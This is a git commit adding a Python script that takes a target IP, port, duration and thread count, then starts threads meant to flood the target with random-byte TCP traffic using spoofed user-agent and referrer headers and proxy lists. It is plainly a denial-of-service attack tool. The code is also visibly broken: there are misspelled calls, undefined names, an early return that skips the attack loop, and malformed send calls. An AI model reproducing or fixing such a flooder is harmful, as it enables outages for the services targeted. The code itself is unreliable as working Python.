b007653792379687322c39114549a05b46d9138c
ZanMoon <157574781+ZanMoon@users.noreply.github.com>
2024-01-25 22:04:49 +0700

    Create New.py

---
+++ New.py
@@ -0,0 +1,72 @@
+import threading, random, sys, struct
+import os, socket, codecs, time, argparse
+proxys = open('proxy.txt').readlines()
+bot1 = open('SOCKS4.txt').readlines()
+bot2 = open('SOCKS5.txt').readlines()
+bot3 = open('ua.txt').readlines()
+Jod = len(proxys)
+yoz = len(bot1)
+bez = len(bot2)
+tud = len(bot3)
+useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
+"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
+"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
+"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
+"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
+"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
+"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
+"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
+"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
+"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
+"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"]
+ref=['http://www.bing.com/search?q=',
+'https://www.ndex.com/ndsearch?text=',
+'https://duckduckgo.com/?q=']
+acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+"Accept-Encoding: gzip, deflate\r\n",
+"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
+"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
+"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
+"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n"
+"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
+"Accept-Language: en-US,en;q=0.5\r\n"]
+ip = str(input("Ip => "))
+port = int(input("Port/t => "))
+times = int(input("Times/s => "))
+th = int(input("Thread/t => "))
+host = socket.gethostbyname(ip)
+os.system('cls' if os.name == 'nt' else 'clear')
+def spoof():
+    global byte1, byte2, pack, pack2, msg
+    global useragents, ref, acceptall
+    byte1 = random._uradom(1024)
+    byte2 = random._urandom(666)
+    UserAgent = "Useragent: "+random.choice(useragents)+random.choice(ref)+"\r\n"
+    reffer = "RefTo: "+random.choice(ref)+"\r\n"
+    acceptall = "AcceptAll: "+random.choice(acceptall)+random.choice(ref)
+    bypass_user = UserAgent + reffer + acceptAll + "\r\n"
+    return byte1
+    return byte2
+    timeout = time.time() + float(times)
+    sock = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_TCP)
+    while True:
+          try:
+              time.time() + float(times)
+              pack = random._urandom(1000)
+              packw = random._urandom(1444)
+              msg = Attack[random.randrange(0,3)]
+              sock.connect((ip, port))
+              sock.send(ip, port)
+              sock.send(ip, port)
+              sock.send(ip, port)
+          except:
+              sock.close()
+    
+for _ in range(th):
+    thred = threading.Thread(target=spoof)
+    thred.start()
+     
